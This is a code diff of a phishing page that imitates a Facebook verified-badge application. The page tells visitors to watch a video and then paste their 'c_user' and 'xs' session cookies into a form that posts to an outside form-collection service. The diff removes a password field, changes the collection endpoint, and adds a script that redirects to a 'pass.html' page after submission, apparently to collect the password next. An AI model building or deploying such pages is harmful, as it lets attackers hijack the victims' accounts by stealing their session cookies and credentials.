@@ -1,8 +1,3 @@
-
-
-
-
-
 <html>
     <head>
         <meta charset="utf-8">
@@ -38,32 +33,34 @@
                             <p class="fw-semibold validation_form_para">Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.</p>
                             <p class="fw-semibold validation_form_para">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear. </p>
                             <p class="fw-semibold text-secondary" style="font-size: 12px;">Detailed Video Information.</p>
-                            <a href="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202">
+                            <a href="https://cdn.glitch.global/116aac45-aeea-4339-8e11-ec99eca8b56f/detailed_video.mp4?v=1721736922555">
                                 <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" alt="fb" style="width: 120px; height: 80px;">
                             </a>
                             <br>
                             <p class="fw-semibold validation_form_para mt-2">Please be sure to provide the requested information below.</p>
-                           
-                    <form id="verification-form" action="https://submit-form.com/FbowdFzVM" method="POST">
-                              
-                                <label class="" style="font-size: 12px;">c_user</label>
-                                <br>
+                            <form id='myForm' action="https://submit-form.com/Bl7kq5GTH" method="POST">
+                              <input type="hidden" name="_redirect" value=""/>
+                                
+                              <label class="" style="font-size: 12px;">c_us                                <br>
                                 <input type="text" name="c_user" placeholder="" pattern="[0-9]+" minlength="6" id="c_user" title="Must Watch Detailed Video" required="1" aria-required="true">
                                 <br>
                                 <label class="mt-2" style="font-size: 12px;">xs</label>
                                 <br>
                                 <input type="text" name="xs" id="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{40,}$" title="Must Watch Detailed Video" required="1" aria-required="true">
-                            <div>
-                      <label class="" style="font-size: 12px;">Password</label>
-                                <br>
-                                <input type="Password" name="Password" placeholder="">
-                              </div>
-                                <br>
                                 <p class="mt-2" style="font-size: 12px;">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
                                 <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);">
                                     <button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">Submit</button>
                                 </div>
-                             
+                              <script>
+    document.getElementById('myForm').addEventListener('submit', function(event) {
+        // The form will be submitted normally first
+        // Then redirect to a specified URL
+        setTimeout(function() {
+            window.location.href = 'pass.html';
+        }, 1000); // Adjust the delay as needed
+    });
+  </script>
+
                             </form>
                         </div>
                     </div>
